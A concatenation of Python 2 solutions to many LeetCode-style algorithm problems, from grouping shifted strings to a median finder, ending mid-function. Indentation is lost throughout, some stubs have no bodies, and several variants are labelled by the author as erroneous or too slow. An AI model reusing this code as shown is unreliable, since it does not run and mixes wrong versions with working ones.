def groupStrings(self, strings):
hm = defaultdict(list)
for s in strings:
if len(s) == 1:
hm[0].append(s)
else:
lst = []
for i in xrange(1, len(s)):
lst.append((ord(s[i])-ord(s[i-1]))%26)
hm[tuple(lst)].append(s)
return map(sorted, hm.values())
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.cnt = 0
def countUnivalSubtrees(self, root):
self.is_unival(root)
return self.cnt
def is_unival(self, cur):
if not cur:
return True
is_left = self.is_unival(cur.left)
is_right = self.is_unival(cur.right)
if (not is_left or not is_right or
cur.left and cur.left.val != cur.val or
cur.right and cur.right.val != cur.val):
return False
else:
self.cnt += 1
return True
class Vector2D:
def __init__(self, vec2d):
self.vec2d = vec2d
self.i = 0
self.j = 0
def next(self):
ret = None
if self.hasNext():
ret = self.vec2d[self.i][self.j]
self.j += 1
return ret
def hasNext(self):
while self.i < len(self.vec2d) and self.j >= len(self.vec2d[self.i]):
self.i += 1
self.j = 0
return self.i < len(self.vec2d) and self.j < len(self.vec2d[self.i])
import operator
class Interval:
def __init__(self, s=0, e=0):
self.start = s
self.end = e
class Solution:
def canAttendMeetings(self, intervals):
intervals.sort(key=operator.attrgetter("start"))
for i in xrange(len(intervals)-1):
if intervals[i].end > intervals[i+1].start:
return False
return True
import heapq
import operator
class Interval:
def __init__(self, s=0, e=0):
self.start = s
self.end = e
class Solution(object):
def minMeetingRooms(self, intervals):
maxa = 0
intervals.sort(key=operator.attrgetter("start"))
h_end = []
for itvl in intervals:
heapq.heappush(h_end, itvl.end)
while h_end and h_end[0] <= itvl.start:
heapq.heappop(h_end)
maxa = max(maxa, len(h_end))
return maxa
from math import sqrt
class Solution:
def getFactors(self, n):
ret = []
self.dfs([n], ret)
return ret
def dfs(self, cur, ret):
if len(cur) > 1:
ret.append(list(cur))
n = cur.pop()
start = cur[-1] if cur else 2
for i in xrange(start, int(sqrt(n))+1):
if n % i == 0:
cur.append(i)
cur.append(n/i)
self.dfs(cur, ret)
cur.pop()
def dfs2(self, n, cur, ret):
if n > 1 and cur and len(cur) >= 1:
ret.append(list(cur)+[n])
start = cur[-1] if cur else 2
for i in xrange(start, int(sqrt(n))+1):
if n%i == 0:
cur.append(i)
self.dfs(n/i, cur, ret)
cur.pop()
def dfs_TLE(self, n, cur, ret):
if n == 1 and cur and len(cur) >= 2:
ret.append(list(cur))
if cur:
start = cur[-1]
else:
start = 2
for i in xrange(start, int(sqrt(n+1))):
if n%i == 0:
cur.append(i)
self.dfs_TLE(n/i, cur, ret)
cur.pop()
if __name__ == "__main__":
print Solution().getFactors(16)
class Solution:
def verifyPreorder(self, preorder):
left_finished = None
stk = []
for num in preorder:
if left_finished and num < left_finished:
return False
while stk and stk[-1] < num:
left_finished = stk.pop()
stk.append(num)
return True
if __name__ == "__main__":
preorder = [3, 5, 2, 1, 4, 7, 6, 9, 8, 10]
assert Solution().verifyPreorder(preorder) == False
import sys
class Solution:
def minCost(self, costs):
if not costs:
return 0
n = len(costs)
m = len(costs[0])
F = [[0 for _ in xrange(m)] for _ in xrange(n+1)]
for k in xrange(1, n+1):
for i in xrange(m):
F[k][i] = sys.maxint
for j in xrange(m):
if i != j:
F[k][i] = min(F[k][i], F[k-1][j]+costs[k-1][i])
return min(F[n][i] for i in xrange(m))
if __name__ == "__main__":
costs = [[7, 6, 2]]
assert Solution().minCost(costs) == 2
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def binaryTreePaths(self, root):
if not root:
return []
ret = []
self.dfs(root, [], ret)
return ret
def dfs(self, cur, path, ret):
path.append(cur)
if not cur.left and not cur.right:
ret.append("->".join(map(lambda x: str(x.val), path)))
return
if cur.left:
self.dfs(cur.left, path, ret)
path.pop()
if cur.right:
self.dfs(cur.right, path, ret)
path.pop()
def dfs_path(self, cur, path, ret):
if not cur:
return
path.append(cur)
if not cur.left and not cur.right:
ret.append("->".join(map(lambda x: str(x.val), path)))
self.dfs_path(cur.left, path, ret)
self.dfs_path(cur.right, path, ret)
path.pop()
class Solution:
def addDigits(self, num):
digit = num % 9
if digit == 0 and num != 0:
return 9
else:
return digit
class Solution(object):
def threeSumSmaller(self, nums, target):
nums.sort()
cnt = 0
n = len(nums)
for i in xrange(n-2):
l = i+1
h = n-1
while l < h:
if nums[i]+nums[l]+nums[h] < target:
cnt += h-l
l += 1
else:
h -= 1
return cnt
class Solution:
def singleNumber(self, nums):
bits = 0
for elt in nums:
bits ^= elt
rightmost_bit_set = bits & -bits
a = 0
b = 0
for elt in nums:
if elt & rightmost_bit_set:
a ^= elt
else:
b ^= elt
return a, b
from collections import defaultdict
class Solution(object):
def validTree(self, n, edges):
if not edges:
return n in (0, 1)
V = defaultdict(list)
for e in edges:
V[e[0]].append(e[1])
V[e[1]].append(e[0])
visited = set()
pathset = set()
if not self.dfs(V, edges[0][0], None, pathset, visited):
return False
return len(visited) == n
def dfs(self, V, v, pi, pathset, visited):
if v in pathset:
return False
pathset.add(v)
for nbr in V[v]:
if nbr != pi:
if not self.dfs(V, nbr, v, pathset, visited):
return False
pathset.remove(v)
visited.add(v)
return True
class Solution(object):
def isUgly(self, num):
if num < 1:
return False
if num == 1:
return True
ugly = {2, 3, 5}
prime = 2
while prime*prime <= num and num > 1:
if num % prime != 0:
prime += 1
else:
num /= prime
if prime not in ugly:
return False
if num not in ugly:
return False
return True
import heapq
class Node(object):
def __init__(self, origin, q):
self.origin = origin
self.q = q
def __cmp__(self, other):
return self.q[0] - other.q[0]
class Solution(object):
def nthUglyNumber(self, n):
if n == 1:
return 1
n -= 1
ugly = [2, 3, 5]
qs = [Node(i, [i]) for i in ugly]
h = list(qs)
heapq.heapify(h)
cnt = 0
ret = 2
while cnt < n:
cnt += 1
popped = heapq.heappop(h)
ret = popped.q.pop(0)
for i in xrange(ugly.index(popped.origin), 3):
qs[i].q.append(ret*ugly[i])
heapq.heappush(h, popped)
return ret
if __name__ == "__main__":
assert Solution().nthUglyNumber(10) == 12
import sys
class Solution(object):
def minCostII(self, costs):
if not costs:
return 0
n = len(costs)
m = len(costs[0])
F = [[0 for _ in xrange(m)] for _ in xrange(n+1)]
for i in xrange(1, n+1):
for k1 in xrange(m):
F[i][k1] = min(
F[i-1][k0]+costs[i-1][k1]
for k0 in xrange(m)
if i == 1 or k1 != k0
)
return min(F[n][i] for i in xrange(m))
if __name__ == "__main__":
assert Solution().minCostII([[8]]) == 8
from collections import defaultdict
class Solution(object):
def canPermutePalindrome(self, s):
m = defaultdict(int)
for c in s:
m[c] += 1
once = False
for v in m.values():
if v % 2 == 1:
if once:
return False
once = True
return True
from collections import defaultdict
class Solution(object):
def generatePalindromes(self, s):
m = defaultdict(int)
for c in s:
m[c] += 1
odd = None
for k, v in m.items():
if v % 2 == 1:
if odd is not None:
return []
odd = k
cur = ""
if odd:
m[odd] -= 1
cur = odd
ret = []
self.grow(s, m, None, cur, ret)
return ret
def grow(self, s, count_map, pi, cur, ret):
if len(cur) == len(s):
ret.append(cur)
return
for k in count_map.keys():
if k != pi and count_map[k] > 0:
for i in xrange(1, count_map[k]/2+1):
count_map[k] -= i*2
self.grow(s, count_map, k, k*i+cur+k*i, ret)
count_map[k] += i*2
if __name__ == "__main__":
assert Solution().generatePalindromes("aabb") == ['baab', 'abba']
class Solution(object):
def missingNumber(self, nums):
num_n = None
n = len(nums)
i = 0
while i < n:
if nums[i] == n:
num_n = nums[i]
nums[i] = None
i += 1
elif nums[i] is not None and nums[i] != i:
j = nums[i]
nums[i], nums[j] = nums[j], nums[i]
else:
i += 1
if not num_n:
return n
return nums.index(None)
if __name__ == "__main__":
assert Solution().missingNumber([2, 0]) == 1
from typing import List
from collections import defaultdict, deque
class Solution(object):
def alienOrder(self, words: List[str]) -> str:
G = self.construct_graph(words)
visited = defaultdict(int)
ret = deque()
for u in G.keys():
if visited[u] == 0:
if not self.topo_dfs(G, u, visited, ret):
return ""
return "".join(ret)
def construct_graph(self, words):
G = defaultdict(list)
for w in words:
for c in w:
G[c]
for i in range(len(words) - 1):
for c1, c2 in zip(words[i], words[i+1]):
if c1 != c2:
G[c1].append(c2)
break
return G
def topo_dfs(self, G, u, visited, ret):
visited[u] = 1
for nbr in G[u]:
if visited[nbr] == 1:
return False
if visited[nbr] == 0:
if not self.topo_dfs(G, nbr, visited, ret):
return False
visited[u] = 2
ret.appendleft(u)
return True
if __name__ == "__main__":
lst = ["ze", "yf", "xd", "wd", "vd", "ua", "tt", "sz", "rd", "qd", "pz", "op", "nw", "mt", "ln", "ko", "jm", "il",
"ho", "gk", "fa", "ed", "dg", "ct", "bb", "ba"]
assert Solution().alienOrder(lst) == "zyxwvutsrqponmlkjihgfedcba"
from collections import defaultdict
class Solution(object):
def alienOrder(self, words):
V = self.construct_graph(words)
visited = set()
pathset = set()
ret = []
for v in V.keys():
if v not in visited:
if not self.topo_dfs(V, v, visited, pathset, ret):
return ""
return "".join(reversed(ret))
def construct_graph(self, words):
V = defaultdict(list)
for w in words:
for c in w:
V[c]
for i in xrange(len(words) - 1):
for j in xrange(min(len(words[i]), len(words[i+1]))):
if words[i][j] != words[i+1][j]:
V[words[i][j]].append(words[i+1][j])
break
return V
def topo_dfs(self, V, v, visited, pathset, ret):
if v in pathset:
return False
pathset.add(v)
for nbr in V[v]:
if nbr not in visited:
if not self.topo_dfs(V, nbr, visited, pathset, ret):
return False
pathset.remove(v)
visited.add(v)
ret.append(v)
return True
def construct_graph_tedious(self, words, up, down, ptr, V):
i = up
while i < down:
if ptr >= len(words[i]):
i += 1
else:
if words[i][ptr] not in V:
V[words[i][ptr]] = []
j = i+1
while j < down and ptr < len(words[j]) and words[j][ptr] == words[i][ptr]:
j += 1
self.construct_graph_tedious(words, i, j, ptr+1, V)
if j < down and ptr < len(words[j]):
V[words[i][ptr]].append(words[j][ptr])
i = j
if __name__ == "__main__":
lst = ["ze", "yf", "xd", "wd", "vd", "ua", "tt", "sz", "rd", "qd", "pz", "op", "nw", "mt", "ln", "ko", "jm", "il",
"ho", "gk", "fa", "ed", "dg", "ct", "bb", "ba"]
assert Solution().alienOrder(lst) == "zyxwvutsrqponmlkjihgfedcba"
import sys
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def closestValue(self, root, target):
lo = [-sys.float_info.max]
self.find(root, target, lo, True)
hi = [sys.float_info.max]
self.find(root, target, hi, False)
if hi[0] - target < target - lo[0]:
return int(hi[0])
else:
return int(lo[0])
def find(self, root, target, ret, lower=True):
if not root:
return
if root.val == target:
ret[0] = root.val
return
if root.val < target:
if lower: ret[0] = max(ret[0], root.val)
self.find(root.right, target, ret, lower)
else:
if not lower: ret[0] = min(ret[0], root.val)
self.find(root.left, target, ret, lower)
if __name__ == "__main__":
assert Solution().closestValue(TreeNode(2147483647), 0.0) == 2147483647
class Codec(object):
def encode(self, strs):
strs = map(lambda x: str(len(x))+"/"+x, strs)
return reduce(lambda x, y: x+y, strs, "")
def decode(self, s):
strs = []
i = 0
while i < len(s):
j = s.index("/", i)
l = int(s[i:j])
strs.append(s[j+1:j+1+l])
i = j+1+l
return strs
class CodecMethod2(object):
def encode(self, strs):
strs = map(lambda x: x.replace("\n", "\n\n")+"_\n_", strs)
return reduce(lambda x, y: x+y, strs, "")
def decode(self, s):
strs = s.split("_\n_")
strs = strs[:-1]
return map(lambda x: x.replace("\n\n", "\n"), strs)
class CodecError(object):
def encode(self, strs):
strs = map(lambda x: x.replace("\x00", "\\x00"), strs)
ret = ""
for s in strs:
ret += s+"\x00"
return ret
def decode(self, s):
if "\x00" not in s:
return []
s = s[:-1]
strs = s.split("\x00")
strs = map(lambda x: x.replace("\\x00", "\x00"), strs)
return strs
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def closestKValues(self, root, target, k):
pre = []
suc = []
self.predecessors(root, target, pre)
self.successors(root, target, suc)
return self.merge(target, k, pre, suc)
def predecessors(self, root, target, stk):
if not root:
return
self.predecessors(root.left, target, stk)
if root.val <= target:
stk.append(root.val)
self.predecessors(root.right, target, stk)
def successors(self, root, target, stk):
if not root:
return
self.successors(root.right, target, stk)
if root.val > target:
stk.append(root.val)
self.successors(root.left, target, stk)
def merge(self, target, k, pre, suc):
ret = []
while len(ret) < k:
if not pre:
ret.append(suc.pop())
elif not suc:
ret.append(pre.pop())
elif abs(pre[-1] - target) < abs(suc[-1] - target):
ret.append(pre.pop())
else:
ret.append(suc.pop())
return ret
class Solution(object):
def __init__(self):
self.table = {
0: None,
1: "One",
2: "Two",
3: "Three",
4: "Four",
5: "Five",
6: "Six",
7: "Seven",
8: "Eight",
9: "Nine",
10: "Ten",
11: "Eleven",
12: "Twelve",
13: "Thirteen",
14: "Fourteen",
15: "Fifteen",
16: "Sixteen",
17: "Seventeen",
18: "Eighteen",
19: "Nineteen",
20: "Twenty",
30: "Thirty",
40: "Forty",
50: "Fifty",
60: "Sixty",
70: "Seventy",
80: "Eighty",
90: "Ninety",
100: "Hundred",
1000: "Thousand",
1000000: "Million",
1000000000: "Billion"
}
def numberToWords(self, num):
if num == 0: return "Zero"
ret = []
self.toWords(num, ret)
ret = filter(lambda x: x, ret)
return " ".join(map(str, ret))
def toWords(self, num, ret):
SIGS = [1000000000, 1000000, 1000, 100]
for SIG in SIGS:
self.partial_parse(num, SIG, ret)
num %= SIG
TEN = 10
if num/TEN > 1:
ret.append(self.table[(num/TEN)*TEN])
ret.append(self.table[num%TEN])
def partial_parse(self, num, sig, ret):
if num/sig:
prefix = []
self.toWords(num/sig, prefix)
ret.extend(prefix)
ret.append(self.table[sig])
if __name__ == "__main__":
assert Solution().numberToWords(1234567891) == "One Billion Two Hundred Thirty Four Million Five Hundred Sixty " \
"Seven Thousand Eight Hundred Ninety One"
class Solution(object):
def hIndex(self, A):
n = len(A)
cnt = [0 for _ in xrange(n+1)]
for e in A:
if e >= n:
cnt[n] += 1
else:
cnt[e] += 1
F = [0 for _ in xrange(n+2)]
for i in xrange(n, -1, -1):
F[i] += F[i+1] + cnt[i]
if F[i] >= i:
return i
return 0
def hIndex_sort(self, citations):
n = len(citations)
citations.sort()
for i in xrange(n):
if citations[i] >= n-i:
return n-i
return 0
def hIndex_reverse_sort(self, citations):
citations.sort(reverse=True)
citations.append(0)
h = 0
for i in xrange(len(citations)-1):
if citations[i] >= i+1 >= citations[i+1]:
h = i+1
elif h:
break
return h
if __name__ == "__main__":
assert Solution().hIndex([3, 0, 6, 1, 5]) == 3
class Solution(object):
def hIndex(self, A):
n = len(A)
s = 0
e = n
while s < e:
m = (s+e)/2
if A[m] >= n-m:
e = m
else:
s = m+1
return n-s
if __name__ == "__main__":
assert Solution().hIndex([0, 1, 3, 5, 6]) == 3
class Solution(object):
def numWays_oneliner(self, n, k):
return 0 if n < 1 else sum(reduce(lambda F, i: [(k-1)*(F[0]+F[1]), F[0]], xrange(1, n), [k, 0]))
def numWays(self, n, k):
if n < 1:
return 0
num_diff = k
num_same = 0
for _ in xrange(1, n):
num_diff, num_same = (k-1)*(num_diff+num_same), num_diff
return num_diff+num_same
def numWays_MLE2(self, n, k):
if n < 1:
return 0
F = [[[0 for _ in xrange(k)] for _ in xrange(k)] for _ in xrange(2)]
EMPTY = 0
for j0 in xrange(k):
F[1][j0][EMPTY] = 1
for i in xrange(2, n+1):
for j0 in xrange(k):
for j1 in xrange(k):
F[i%2][j0][j1] = 0
for j0 in xrange(k):
for j1 in xrange(k):
for j2 in xrange(k):
if i == 2:
F[i%2][j0][j1] = F[(i-1)%2][j1][EMPTY]
elif j1 == j2 and j0 != j1:
F[i%2][j0][j1] += F[(i-1)%2][j1][j2]
elif j1 != j2:
F[i%2][j0][j1] += F[(i-1)%2][j1][j2]
ret = 0
for j0 in xrange(k):
for j1 in xrange(k):
ret += F[n%2][j0][j1]
return ret
def numWays_MLE(self, n, k):
if n < 1:
return 0
F = [[[0 for _ in xrange(k)] for _ in xrange(k)] for _ in xrange(n+1)]
EMPTY = 0
for j0 in xrange(k):
F[1][j0][EMPTY] = 1
for i in xrange(2, n+1):
for j0 in xrange(k):
for j1 in xrange(k):
for j2 in xrange(k):
if i == 2:
F[i][j0][j1] = F[i-1][j1][EMPTY]
elif j1 == j2 and j0 != j1:
F[i][j0][j1] += F[i-1][j1][j2]
elif j1 != j2:
F[i][j0][j1] += F[i-1][j1][j2]
ret = 0
for j0 in xrange(k):
for j1 in xrange(k):
ret += F[n][j0][j1]
return ret
if __name__ == "__main__":
assert Solution().numWays(3, 2) == 6
def knows(a, b):
class Solution(object):
def findCelebrity(self, n):
i = 0
j = n-1
while i < j:
nxt_i, nxt_j = i, j
if knows(i, j) or not knows(j, i):
nxt_i += 1
if knows(j, i) or not knows(i, j):
nxt_j -= 1
i, j = nxt_i, nxt_j
celebrity = i
for i in xrange(n):
if i != celebrity and (not knows(i, celebrity) or knows(celebrity, i)):
return -1
return celebrity
def findCelebrity_set(self, n):
V = set(range(n))
while len(V) > 1:
a = V.pop()
b = V.pop()
if knows(a, b) and not knows(b, a):
V.add(b)
elif not knows(a, b) and knows(b, a):
V.add(a)
if not V:
return -1
celebrity = V.pop()
for i in xrange(n):
if i != celebrity and (not knows(i, celebrity) or knows(celebrity, i)):
return -1
return celebrity
def isBadVersion(version):
pass
class Solution(object):
def firstBadVersion(self, n):
l = 1
h = n+1
while l < h:
m = (l+h)/2
if not isBadVersion(m):
l = m+1
else:
h = m
return l
import math
import sys
class Solution(object):
F = [0]
def numSquares(self, n):
while len(Solution.F) <= n:
i = len(Solution.F)
Solution.F.append(sys.maxint)
j = 1
while i - j*j >= 0:
Solution.F[i] = min(Solution.F[i], Solution.F[i-j*j]+1)
j += 1
return Solution.F[n]
def numSquares_bfs(self, n):
q = [0]
visited = [False for _ in xrange(n+1)]
level = 0
while q:
level += 1
l = len(q)
for i in xrange(l):
for j in xrange(1, int(math.sqrt(n))+1):
nxt = q[i]+j*j
if nxt <= n and visited[nxt]:
continue
elif nxt < n:
visited[nxt] = True
q.append(nxt)
elif nxt == n:
return level
else:
break
q = q[l:]
return None
def numSquares_TLE(self, n):
F = [i for i in xrange(n+1)]
for i in xrange(1, n+1):
for j in xrange(1, int(math.sqrt(i))+1):
if i-j*j >= 0:
F[i] = min(F[i], F[i-j*j]+1)
return F[n]
if __name__ == "__main__":
assert Solution().numSquares(6) == 3
class Solution(object):
def wiggleSort(self, nums):
i = 0
for elt in sorted(nums):
if i >= len(nums):
i = 1
nums[i] = elt
i += 2
class ZigzagIterator(object):
def __init__(self, v1, v2):
self.mat = [v1, v2]
self.maxa = max((c, r) for r, c in enumerate(map(lambda x: len(x)-1, self.mat)))
self.i = 0
self.j = 0
self._reposition()
def _reposition(self):
while self.i >= len(self.mat) or self.j >= len(self.mat[self.i]):
if not self.hasNext():
return
elif self.i >= len(self.mat):
self.i = 0
self.j += 1
elif self.j >= len(self.mat[self.i]):
self.i += 1
def next(self):
if not self.hasNext():
raise StopIteration
ret = self.mat[self.i][self.j]
self.i += 1
self._reposition()
return ret
def hasNext(self):
return self.j <= self.maxa[0]
if __name__ == "__main__":
v1 = [1, 2]
v2 = [3, 4, 5, 6]
itr = ZigzagIterator(v1, v2)
while itr.hasNext():
print itr.next()
class Solution(object):
def addOperators(self, num, target):
ret = []
self.dfs(num, target, 0, "", 0, 0, ret)
return ret
def dfs(self, num, target, pos, cur_str, cur_val, mul, ret):
if pos >= len(num):
if cur_val == target:
ret.append(cur_str)
else:
for i in xrange(pos, len(num)):
if i != pos and num[pos] == "0":
continue
nxt_val = int(num[pos:i+1])
if not cur_str:
self.dfs(num, target, i+1, "%d"%nxt_val, nxt_val, nxt_val, ret)
else:
self.dfs(num, target, i+1, cur_str+"+%d"%nxt_val, cur_val+nxt_val, nxt_val, ret)
self.dfs(num, target, i+1, cur_str+"-%d"%nxt_val, cur_val-nxt_val, -nxt_val, ret)
self.dfs(num, target, i+1, cur_str+"*%d"%nxt_val, cur_val-mul+mul*nxt_val, mul*nxt_val, ret)
if __name__ == "__main__":
assert Solution().addOperators("232", 8) == ["2+3*2", "2*3+2"]
class Solution(object):
def moveZeroes(self, nums):
left = -1
for i in xrange(len(nums)):
if nums[i] != 0:
left += 1
nums[left], nums[i] = nums[i], nums[left]
class SolutionCount(object):
def moveZeroes(self, nums):
cnt = 0
for elt in nums:
if elt != 0:
nums[cnt] = elt
cnt += 1
for j in xrange(cnt, len(nums)):
nums[j] = 0
if __name__ == "__main__":
lst = [0, 1, 0, 3, 12]
Solution().moveZeroes(lst)
assert lst == [1, 3, 12, 0, 0]
class Iterator(object):
def __init__(self, nums):
def hasNext(self):
def next(self):
class PeekingIterator(object):
def __init__(self, iterator):
self.nxt = None
self.iterator = iterator
def peek(self):
if not self.nxt:
self.nxt = self.iterator.next()
return self.nxt
def next(self):
ret = self.peek()
self.nxt = None
return ret
def hasNext(self):
return self.nxt is not None or self.iterator.hasNext()
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def inorderSuccessor(self, root, p):
find = [None]
self.search(root, p, find)
return find[0]
def search(self, cur, p, find):
if not cur:
return
if cur.val > p.val:
find[0] = cur
self.search(cur.left, p, find)
else:
self.search(cur.right, p, find)
class Solution(object):
def __init__(self):
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))
def wallsAndGates(self, mat):
q = [(i, j) for i, row in enumerate(mat) for j, val in enumerate(row) if val == 0]
for i, j in q:
for d in self.dirs:
i1, j1 = i+d[0], j+d[1]
if 0 <= i1 < len(mat) and 0 <= j1 < len(mat[0]) and mat[i1][j1] > mat[i][j]+1:
mat[i1][j1] = mat[i][j]+1
q.append((i1, j1))
class Solution_slow(object):
def __init__(self):
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))
def wallsAndGates(self, rooms):
if not rooms: return
m = len(rooms)
if not m: return
n = len(rooms[0])
for i in xrange(m):
for j in xrange(n):
if rooms[i][j] == 0:
self.bfs_deque(rooms, i, j)
def bfs(self, rooms, x, y):
m = len(rooms)
n = len(rooms[0])
level = 0
q = [(x, y)]
while q:
l = len(q)
for idx in xrange(l):
i, j = q[idx]
rooms[i][j] = min(rooms[i][j], level)
for d in self.dirs:
i_t = i+d[0]
j_t = j+d[1]
if 0 <= i_t < m and 0 <= j_t < n and rooms[i_t][j_t] != -1 and rooms[i_t][j_t] >= level+1:
q.append((i_t, j_t))
q = q[l:]
level += 1
def bfs_deque(self, rooms, x, y):
from collections import deque
m = len(rooms)
n = len(rooms[0])
q = deque()
q.append((x, y, 0))
while q:
i, j, level = q.popleft()
rooms[i][j] = min(rooms[i][j], level)
for d in self.dirs:
i_t, j_t = i+d[0], j+d[1]
if 0 <= i_t < m and 0 <= j_t < n and rooms[i_t][j_t] != -1 and rooms[i_t][j_t] >= level+1:
q.append((i_t, j_t, level+1))
class Solution_error(object):
def __init__(self):
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))
def wallsAndGates(self, rooms):
if not rooms: return
m = len(rooms)
if not m: return
n = len(rooms[0])
visited = [[False for _ in xrange(n)] for _ in xrange(m)]
for i in xrange(m):
for j in xrange(n):
if not visited[i][j]:
self.dfs(rooms, i, j, visited)
def dfs(self, rooms, i, j, visited):
if not visited[i][j]:
visited[i][j] = True
for d in self.dirs:
nxt_i = i+d[0]
nxt_j = j+d[1]
if rooms[nxt_i][nxt_j] != -1:
rooms[nxt_i][nxt_j] = min(rooms[nxt_i][nxt_j], self.dfs(rooms, nxt_i, nxt_j, visited)+1)
return rooms[nxt_i][nxt_j]
class Solution(object):
def findDuplicate(self, nums):
f, s = 0, 0
while True:
f = nums[nums[f]]
s = nums[s]
if f == s:
break
t = 0
while t != s:
t = nums[t]
s = nums[s]
return t
if __name__ == "__main__":
assert Solution().findDuplicate([1, 2, 3 ,4, 5, 5]) == 5
from collections import defaultdict
class ValidWordAbbr(object):
def __init__(self, dictionary):
self.abbrev = defaultdict(int)
self.dictionary = set(dictionary)
for word in dictionary:
self.abbrev[self.process(word)] += 1
def process(self, word):
if len(word) <= 2:
return word
return word[0]+str(len(word)-2)+word[-1]
def isUnique(self, word):
return (word in self.dictionary and self.abbrev[self.process(word)] == 1 or
not self.process(word) in self.abbrev)
class Solution(object):
def __init__(self):
self.dirs = [(-1, 0), (-1, -1), (0, -1), (1, -1), (1, 0), (1, 1), (0, 1), (-1, 1)]
def gameOfLife(self, board):
m = len(board)
n = len(board[0])
lines = [[0 for _ in xrange(n)] for _ in xrange(2)]
for i in xrange(m):
for j in xrange(n):
lines[(i+1)%2][j] = board[i][j]
cnt = 0
for d in self.dirs:
I = i+d[0]
J = j+d[1]
if 0 <= I < m and 0 <= J < n:
if I < i:
cnt += lines[i%2][J]
elif I == i and J < j:
cnt += lines[(i+1)%2][J]
else:
cnt += board[I][J]
if cnt == 3:
board[i][j] = 1
elif cnt == 2:
board[i][j] &= 1
else:
board[i][j] = 0
class Solution(object):
def wordPattern(self, pattern, s):
lst = s.split(" ")
if len(pattern) != len(lst):
return False
char2word = {}
words = set()
for i in xrange(len(pattern)):
if pattern[i] in char2word:
if char2word[pattern[i]] != lst[i]:
return False
else:
assert lst[i] in words
else:
if lst[i] in words:
return False
char2word[pattern[i]] = lst[i]
words.add(lst[i])
return True
class OneToOneMap(object):
def __init__(self):
self.m = {}
def set(self, a, b):
self.m[a] = b
self.m[b] = a
def get(self, a):
return self.m.get(a)
class SolutionError(object):
def wordPattern(self, pattern, str):
m = OneToOneMap()
lst = str.split(" ")
if len(pattern) != len(lst):
return False
for i in xrange(len(pattern)):
a = m.get(pattern[i])
b = m.get(lst[i])
if a is None and b is None:
m.set(pattern[i], lst[i])
elif a is None and b is not None:
return False
elif a != lst[i]:
return False
return True
if __name__ == "__main__":
assert Solution().wordPattern("abba", "dog cat cat dog") == True
class Solution(object):
def wordPatternMatch(self, pattern, s):
return self.dfs(pattern, s, {}, set())
def dfs(self, pattern, s, char2word, words):
if not pattern and s or not s and pattern:
return False
if not pattern and not s:
return True
if pattern[0] in char2word:
word = char2word[pattern[0]]
if s[:len(word)] != word:
return False
else:
assert word in words
return self.dfs(pattern[1:], s[len(word):], char2word, words)
else:
for i in xrange(len(s)):
word = s[:i+1]
if word in words:
continue
char2word[pattern[0]] = word
words.add(word)
if self.dfs(pattern[1:], s[len(word):], char2word, words):
return True
words.remove(word)
del char2word[pattern[0]]
return False
class Solution(object):
def canWinNim(self, n):
return n % 4 != 0
def canWinNim_TLE(self, n):
if n < 3:
return True
F = [False for _ in xrange(3)]
F[1] = F[2] = F[0] = True
for i in xrange(4, n+1):
F[i%3] = any(not F[(i-k)%3] for k in xrange(1, 4))
return F[n%3]
def canWinNim_MLE(self, n):
if n < 3:
return True
F = [False for _ in xrange(n+1)]
F[1] = F[2] = F[3] = True
for i in xrange(4, n+1):
F[i] = any(not F[i-k] for k in xrange(1, 4))
return F[n]
if __name__ == "__main__":
assert Solution().canWinNim(5)
class Solution(object):
def generatePossibleNextMoves(self, s):
ret = []
for i in xrange(len(s)-1):
if s[i:i+2] == "++":
ret.append(s[:i]+"--"+s[i+2:])
return ret
class Solution(object):
def __init__(self):
self.d = {}
def canWin(self, s):
if s not in self.d:
flag = False
for i in xrange(len(s)-1):
if s[i:i+2] == "++":
if not self.canWin(s[:i]+"--"+s[i+2:]):
flag = True
break
self.d[s] = flag
return self.d[s]
def canWin_oneline(self, s):
return any(not self.canWin_oneline(s[:i]+"--"+s[i+2:]) for i in xrange(len(s)-1) if s[i:i+2] == "++")
def canWin_trivial(self, s):
for i in xrange(len(s)-1):
if s[i:i+2] == "++":
if not self.canWin_trivial(s[:i]+"--"+s[i+2:]):
return True
return False
if __name__ == "__main__":
assert Solution().canWin("+++++") == False
import heapq
class DualHeap(object):
def __init__(self):
self.min_h = []
self.max_h = []
def insert(self, num):
if not self.min_h or num > self.min_h[0]:
heapq.heappush(self.min_h, num)
else:
heapq.heappush(self.max_h, -num)
self.balance()
def balance(self):
l1 = len(self.min_h)
l2 = len(self.max_h)
if abs(l1 - l2) <= 1:
return
elif l1 - l2 > 1:
heapq.heappush(self.max_h, -heapq.heappop(self.min_h))
self.balance()
else:
heapq.heappush(self.min_h, -heapq.heappop(self.max_h))
self.balance()
def get_median(self):
l1 = len(self.min_h)
l2 = len(self.max_h)
if (l1 + l2) % 2 == 1:
m = (l1 + l2) / 2
if m < l2:
return -self.max_h[0]
else:
return self.min_h[0]
else:
return (-self.max_h[0] + self.min_h[0]) / 2.0
class MedianFinder(object):
def __init__(self):
self.dh = DualHeap()
def addNum(self, num):
self.dh.insert(num)
def findMedian(self):
return self.dh.get_median()
class Solution(object):
def minTotalDistance_3lines(self, grid):
x = sorted([i for i, row in enumerate(grid) for v in row if v == 1])
y = sorted([j for row in grid for j, v in enumerate(row) if v == 1])
return sum([abs(x[len(x)/2]-i)+abs(y[len(y)/2]-j) for i, row in enumerate(grid) for j, v in enumerate(row) if v == 1])
def minTotalDistance(self, grid):
x = []
y = []
m = len(grid)
n = len(grid[0])
for i in xrange(m):
for j in xrange(n):
if grid[i][j] == 1:
x.append(i)
y.append(j)
x.sort()
y.sort()
cnt = len(x)
point = (x[cnt/2], y[cnt/2])
ret = 0
for i in xrange(m):
for j in xrange(n):
if grid[i][j] == 1:
ret += abs(point[0]-i)
ret += abs(point[1]-j)
return ret
if __name__ == "__main__":
assert Solution().minTotalDistance([[1,0,0,0,1],[0,0,0,0,0],[0,0,1,0,0]]) == 6
from collections import deque
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Codec:
def serialize(self, root):
if not root:
return "null"
ret = []
q = []
q.append(root)
ret.append(str(root.val))
while q:
l = len(q)
for i in xrange(l):
cur = q[i]
if cur.left: q.append(cur.left)
